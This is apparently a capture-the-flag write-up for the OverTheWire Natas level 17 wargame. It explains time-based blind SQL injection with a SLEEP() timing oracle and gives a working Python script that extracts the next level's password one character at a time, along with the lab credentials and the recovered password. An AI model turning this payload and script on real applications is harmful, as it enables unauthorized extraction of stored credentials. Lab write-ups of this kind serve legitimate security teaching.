## Overview

This level demonstrates a **time-based blind SQL injection vulnerability**, where the application does not return query output or distinguishable error messages. Instead, exploitation is achieved by observing **response time differences** caused by conditional database delays.

The goal is to extract the password for the next level by leveraging the SQL `SLEEP()` function as a timing oracle.

---

## Vulnerability Analysis

The backend SQL query is vulnerable to injection within a string context, allowing the attacker to modify logic using boolean conditions.

Key constraints observed:

* No meaningful output is returned from the query
* No visible error messages are displayed
* Traditional boolean-based inference is not viable
* Timing differences can be introduced using SQL functions

---

## Exploitation Strategy

### Core Concept: Time-Based Oracle

Instead of relying on output differences, this attack uses execution delay:

* If condition is **true** → query triggers `SLEEP(1)` → response is delayed
* If condition is **false** → query executes normally → immediate response

This creates a **binary timing channel**.

---

## SQL Injection Payload Logic

The injection uses:

```sql id="xk9p2q"
AND BINARY password LIKE "<prefix>%"
AND SLEEP(1)
```

### Breakdown:

* `BINARY` ensures case-sensitive comparison
* `LIKE "<prefix>%"` performs prefix matching
* `SLEEP(1)` introduces delay when condition evaluates to true

---

## Attack Methodology

The password is extracted **character by character**:

1. Start with an empty prefix
2. Append candidate characters from the charset:

   * a–z
   * A–Z
   * 0–9
3. Test each candidate using the timing oracle
4. If response time exceeds threshold → character is correct
5. Repeat until full password is recovered (32 characters)

---

## Automation Script

The following Python script automates the extraction process:

```python id="natas17-sqli-timing"
#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import time
import string

# Character set: lowercase + uppercase + digits
characters = string.ascii_lowercase + string.ascii_uppercase + string.digits

username = 'natas17'
password = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'

url = f'http://{username}.natas.labs.overthewire.org/'

session = requests.Session()

seen_password = []

while len(seen_password) < 32:
    for character in characters:
        test_password = ''.join(seen_password) + character
        print(f"Trying: {test_password}")

        start_time = time.time()

        payload = (
            f'natas18" AND BINARY password LIKE "{test_password}%" '
            f'AND SLEEP(1) #'
        )

        response = session.post(
            url,
            data={"username": payload},
            auth=(username, password)
        )

        end_time = time.time()
        difference = end_time - start_time

        if difference > 1:
            seen_password.append(character)
            print(f"[+] Found so far: {''.join(seen_password)}")
            break

print("Recovered password:", ''.join(seen_password))
```
Recovered password: `6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ`
